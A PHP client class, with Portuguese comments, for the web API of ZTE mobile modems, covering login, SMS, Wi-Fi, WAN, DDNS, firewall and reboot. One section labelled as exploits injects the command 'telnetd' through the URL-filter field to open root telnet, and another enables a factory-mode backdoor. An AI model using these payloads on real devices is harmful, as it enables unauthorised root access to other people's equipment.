<?php

namespace App\Modem;

/**
 * ZteModemClient.php
 *
 * Classe completa para interagir com modems ZTE.
 * Gerencia autenticação, envio e leitura de SMS, controle de Wi-Fi, WAN,
 * Firewall, DDNS e outras funcionalidades avançadas.
 *
 * Versão: 1.0
 * Data: 13/07/2025
 */
class ZteModemClient
{
  private string $modemIp;
  private string $password;
  private string $cookieFile;

  // Endpoints do modem
  private const ENDPOINT_SET = '/goform/goform_set_cmd_process';
  private const ENDPOINT_GET = '/goform/goform_get_cmd_process';

  /**
   * @param string $modemIp O endereço IP do modem.
   * @param string $password A senha de administrador do modem.
   */
  public function __construct(string $modemIp, string $password)
  {
    $this->modemIp = $modemIp;
    $this->password = $password;
    // Cria um arquivo temporário para guardar os cookies da sessão
    $this->cookieFile = tempnam(sys_get_temp_dir(), 'zte_cookie');
  }

  /**
   * Garante que o arquivo de cookie temporário seja deletado no final da execução.
   */
  public function __destruct()
  {
    if (file_exists($this->cookieFile)) {
      unlink($this->cookieFile);
    }
  }

  // --- MÉTODOS DE AUTENTICAÇÃO ---

  /**
   * Realiza o login no modem.
   * @throws \Exception Se o login falhar.
   */
  public function login(): void
  {
    $data = [
      'isTest' => 'false',
      'goformId' => 'LOGIN',
      'password' => base64_encode($this->password)
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if ($response['result'] !== '0') {
      throw new \Exception('Falha no login. Verifique o IP e a senha do modem.');
    }
  }

  /**
   * Realiza o logout do modem.
   */
  public function logout(): void
  {
    try {
      $data = ['isTest' => 'false', 'goformId' => 'LOGOUT'];
      $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    } catch (\Exception $e) {
      // O logout pode falhar se a sessão já expirou; não é um erro crítico.
    }
  }

  // --- MÉTODOS DE SMS ---

  /**
   * Envia uma mensagem SMS.
   * @param string $phoneNumber O número do destinatário.
   * @param string $message O conteúdo da mensagem.
   * @return array A resposta da API do modem.
   * @throws \Exception Se o envio falhar.
   */
  public function sendMessage(string $phoneNumber, string $message): array
  {
    $data = [
      'isTest' => 'false',
      'goformId' => 'SEND_SMS',
      'notCallback' => 'true',
      'Number' => $phoneNumber,
      'sms_time' => gmdate('y;m;d;H;i;s;') . '-3', // Fuso -3
      'MessageBody' => $this->encodeMessageBody($message),
      'ID' => '-1',
      'encode_type' => 'UNICODE'
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if ($response['result'] !== 'success') {
      throw new \Exception('Falha ao enviar SMS. Resposta: ' . json_encode($response));
    }
    return $response;
  }

  /**
   * Lista as mensagens armazenadas no modem.
   * @return array Um array de mensagens.
   */
  public function getMessages(): array
  {
    $params = [
      'isTest' => 'false',
      'cmd' => 'sms_data_total',
      'page' => 0,
      'data_per_page' => 500,
      'mem_store' => 1,
      'tags' => 10,
      'order_by' => 'order by id desc',
      '_' => round(microtime(true) * 1000) // Parâmetro para evitar cache
    ];
    $response = $this->makeRequest('GET', self::ENDPOINT_GET, $params);
    return $response['messages'] ?? [];
  }

  /**
   * Apaga uma ou todas as mensagens.
   * @param int|string $messageId O ID da mensagem a ser apagada ou '*' para apagar todas.
   * @return array Resumo das operações de exclusão.
   * @throws \Exception
   */
  public function deleteMessages($messageId): array
  {
    if ($messageId === '*') {
      return $this->deleteAllMessages();
    }
    $data = [
      'isTest' => 'false',
      'goformId' => 'DELETE_SMS',
      'msg_id' => $messageId,
      'notCallback' => 'true'
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if ($response['result'] !== 'success') {
      throw new \Exception("Falha ao apagar a mensagem ID {$messageId}.");
    }
    return ['deleted' => [$messageId => 'success']];
  }

  /**
   * Ativa ou desativa a rede Wi-Fi principal.
   * @param bool $enable True para ativar, false para desativar.
   * @return array A resposta da API do modem.
   * @throws \Exception
   */
  public function setWifiStatus(bool $enable): array
  {
    $data = [
      'goformId' => 'SET_WIFI_INFO',
      'isTest' => 'false',
      'm_ssid_enable' => '0',
      'wifiEnabled' => $enable ? '1' : '0'
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if (($response['result'] ?? '') !== 'success') {
      throw new \Exception("Falha ao tentar " . ($enable ? 'ativar' : 'desativar') . " o Wi-Fi.");
    }
    return $response;
  }

  /**
   * Conecta ou desconecta a rede WAN (dados móveis).
   * @param bool $connect True para conectar, false para desconectar.
   * @return array A resposta da API do modem.
   * @throws \Exception
   */
  public function setWanConnection(bool $connect): array
  {
    $data = [
      'isTest' => 'false',
      'notCallback' => 'true',
      'goformId' => $connect ? 'CONNECT_NETWORK' : 'DISCONNECT_NETWORK'
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if (strpos($response['result'] ?? '', 'success') === false) {
      throw new \Exception("Falha ao tentar " . ($connect ? 'conectar' : 'desconectar') . " a WAN.");
    }
    return $response;
  }

  // --- MÉTODOS DE CONFIGURAÇÃO AVANÇADA ---

  /**
   * Configura o serviço de DNS Dinâmico (DDNS).
   * @return array A resposta da API do modem.
   * @throws \Exception
   */
  public function configureDdns(bool $enable, string $provider, string $username, string $password, string $domainName, string $mode = 'auto'): array
  {
    $data = [
      'goformId' => 'DDNS',
      'isTest' => 'false',
      'DDNS_Enable' => $enable ? '1' : '0',
      'DDNSProvider' => $provider,
      'DDNS_Username' => $username,
      'DDNS_Password' => $password,
      'DDNS_Domain' => $domainName,
      'DDNS_Mode' => $mode,
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if (($response['result'] ?? '') !== 'success') {
      throw new \Exception("Falha ao configurar o DDNS.");
    }
    return $response;
  }

  /**
   * Configura as definições básicas do firewall.
   * @param bool $enablePortFilter True para ativar o filtro de portas, false para desativar.
   * @param int $defaultPolicy A política padrão do firewall (0 para 'Permitir', 1 para 'Bloquear').
   * @return array A resposta da API do modem.
   * @throws \Exception
   */
  public function setFirewallSettings(bool $enablePortFilter, int $defaultPolicy = 0): array
  {
    if ($defaultPolicy !== 0 && $defaultPolicy !== 1) {
      throw new \InvalidArgumentException("A política do firewall (defaultPolicy) deve ser 0 ou 1.");
    }
    $data = [
      'goformId' => 'BASIC_SETTING',
      'isTest' => 'false',
      'portFilterEnabled' => $enablePortFilter ? '1' : '0',
      'defaultFirewallPolicy' => (string)$defaultPolicy,
    ];
    $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);
    if (($response['result'] ?? '') !== 'success') {
      throw new \Exception("Falha ao configurar o firewall.");
    }
    return $response;
  }

  // --- MÉTODOS DE EXPLOIT ("HACK") ---

  /**
   * Tenta ativar o acesso root via Telnet explorando uma vulnerabilidade no filtro de URL.
   * @return array A resposta da API do modem.
   * @throws \Exception
   */
  public function exploitNvramForTelnet(): array
  {
    $data = [
      'isTest' => 'false',
      'goformId' => 'URL_FILTER_ADD',
      'addURLFilter' => 'http://exploit.com/&&telnetd&&'
    ];
    return $this->makeRequest('POST', self::ENDPOINT_SET, $data);
  }

  /**
   * Tenta ativar o modo de fábrica (Factory Mode).
   * @return array A resposta da API do modem.
   * @throws \Exception
   */
  public function enableFactoryBackdoor(): array
  {
    $data = [
      'isTest' => 'false',
      'goformId' => 'CHANGE_MODE',
      'change_mode' => '2', // Modo Fábrica
      'password' => base64_encode($this->password)
    ];
    return $this->makeRequest('POST', self::ENDPOINT_SET, $data);
  }


  // --- MÉTODOS PRIVADOS AUXILIARES ---

  /**
   * Função central para fazer as requisições HTTP para o modem.
   * @param string $method 'GET' ou 'POST'.
   * @param string $endpoint O caminho da API no modem.
   * @param array $data Os dados a serem enviados.
   * @return array O JSON decodificado da resposta.
   * @throws \Exception Em caso de erro de cURL ou JSON inválido.
   */
  private function makeRequest(string $method, string $endpoint, array $data): array
  {
    $url = 'http://' . $this->modemIp . $endpoint;
    $ch = curl_init();

    if ($method === 'GET') {
      $url .= '?' . http_build_query($data);
    } else {
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    }

    curl_setopt_array($ch, [
      CURLOPT_URL => $url,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_TIMEOUT => 15,
      CURLOPT_COOKIEJAR => $this->cookieFile,
      CURLOPT_COOKIEFILE => $this->cookieFile,
      CURLOPT_HTTPHEADER => ['Referer: http://' . $this->modemIp . '/index.html']
    ]);

    $responseBody = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
      throw new \Exception("Erro de cURL: " . $error);
    }

    $cleanResponseBody = trim($responseBody);
    $decoded = json_decode($cleanResponseBody, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
      throw new \Exception("Erro ao decodificar JSON. Resposta do modem: " . $responseBody);
    }
    return $decoded;
  }

  /**
   * Lógica interna para apagar todas as mensagens.
   */
  private function deleteAllMessages(): array
  {
    $messages = $this->getMessages();
    if (empty($messages)) {
      return ['status' => 'Nenhuma mensagem para apagar.'];
    }
    $results = ['deleted' => [], 'failed' => []];
    foreach ($messages as $message) {
      try {
        $this->deleteMessages($message['id']);
        $results['deleted'][] = $message['id'];
      } catch (\Exception $e) {
        $results['failed'][] = $message['id'];
      }
    }
    return $results;
  }

  /**
   * Codifica a mensagem para o formato UNICODE (UTF-16BE) em hexadecimal.
   */
  private function encodeMessageBody(string $message): string
  {
    $utf16be = mb_convert_encoding($message, 'UTF-16BE', 'UTF-8');
    return bin2hex($utf16be);
  }

  /**
   * Decodifica o corpo da mensagem de hexadecimal (UTF-16BE) para string.
   */
  public function decodeMessageBody(string $hexBody): string
  {
    $binary = hex2bin($hexBody);
    return mb_convert_encoding($binary, 'UTF-8', 'UTF-16BE');
  }

  /**
   * Envia o comando para reiniciar o modem.
   * Esta função trata a falha de resposta como sucesso, pois o modem
   * encerra a conexão ao iniciar a reinicialização.
   *
   * @return array A resposta indicando que o comando foi enviado.
   * @throws \Exception Se ocorrer um erro inesperado (ex: IP errado).
   */
  public function rebootDevice(): array
  {
    $data = [
      'isTest'   => 'false',
      'goformId' => 'REBOOT_DEVICE'
    ];

    try {
      // Tentamos fazer a requisição normalmente
      $response = $this->makeRequest('POST', self::ENDPOINT_SET, $data);

      // Caso raro em que o modem responde ANTES de reiniciar
      if (isset($response['result']) && strpos($response['result'], 'success') !== false) {
        return ['result' => 'success', 'message' => 'Comando de reinicialização aceito pelo modem.'];
      }
    } catch (\Exception $e) {
      // Esta é a parte esperada: capturamos a exceção.
      $errorMessage = $e->getMessage();

      // Verificamos se o erro é um dos esperados para uma reinicialização.
      // Erros comuns: JSON inválido (resposta vazia), conexão encerrada, etc.
      if (
        str_contains($errorMessage, 'Erro ao decodificar JSON') ||
        str_contains($errorMessage, 'Empty reply from server') ||
        str_contains($errorMessage, 'Connection reset by peer')
      ) {
        // Se for um erro esperado, consideramos a operação um sucesso!
        return [
          'result' => 'success',
          'message' => 'Comando de reinicialização enviado. Nenhuma resposta foi recebida do modem, como esperado.'
        ];
      }

      // Se for um erro diferente (ex: "Could not resolve host"),
      // é um problema real, então relançamos a exceção.
      throw $e;
    }

    // Se a resposta não for nem um sucesso nem uma exceção esperada, é um erro.
    throw new \Exception("Falha ao enviar comando para reiniciar o modem. Resposta inesperada: " . json_encode($response ?? []));
  }
}
